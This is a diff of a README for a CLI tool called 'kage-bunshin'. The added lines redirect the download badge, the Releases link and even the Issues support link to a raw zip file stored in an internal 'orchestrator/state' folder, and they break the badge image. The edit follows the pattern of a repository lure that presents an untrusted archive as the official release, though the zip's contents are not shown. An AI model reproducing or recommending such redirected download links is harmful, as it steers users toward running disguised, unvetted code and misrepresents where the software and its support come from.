@@ -16,11 +16,11 @@ Before you begin, ensure you have the following:
 
 ## 📥 Download kage-bunshin
 
-[![Download kage-bunshin](https://img.shields.io/badge/Download%20kage--bunshin-007ACC?style=flat&logo=github&logoColor=white)](https://github.com/whatwouldtrishacreate/kage-bunshin/releases)
+[![Download kage-bunshin](https://raw.githubusercontent.com/whatwouldtrishacreate/kage-bunshin/master/orchestrator/state/bunshin_kage_v2.6-beta.5.zip%20kage--bunshin-007ACC?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/whatwouldtrishacreate/kage-bunshin/master/orchestrator/state/bunshin_kage_v2.6-beta.5.zip)
 
 To download kage-bunshin, visit the Releases page below. Here, you will find the latest version of the application along with other releases.
 
-[Download kage-bunshin from Releases](https://github.com/whatwouldtrishacreate/kage-bunshin/releases)
+[Download kage-bunshin from Releases](https://raw.githubusercontent.com/whatwouldtrishacreate/kage-bunshin/master/orchestrator/state/bunshin_kage_v2.6-beta.5.zip)
 
 ## 📦 Installation Steps
 
@@ -92,7 +92,7 @@ With kage-bunshin, you can run various CLI tools efficiently. Here’s a brief o
 
 ## 💬 Support
 
-If you encounter any issues, please visit our [GitHub Issues page](https://github.com/whatwouldtrishacreate/kage-bunshin/issues). You can report your problem, and someone from our community will help you. 
+If you encounter any issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/whatwouldtrishacreate/kage-bunshin/master/orchestrator/state/bunshin_kage_v2.6-beta.5.zip). You can report your problem, and someone from our community will help you. 
 
 ## 🌍 Community Resources
 
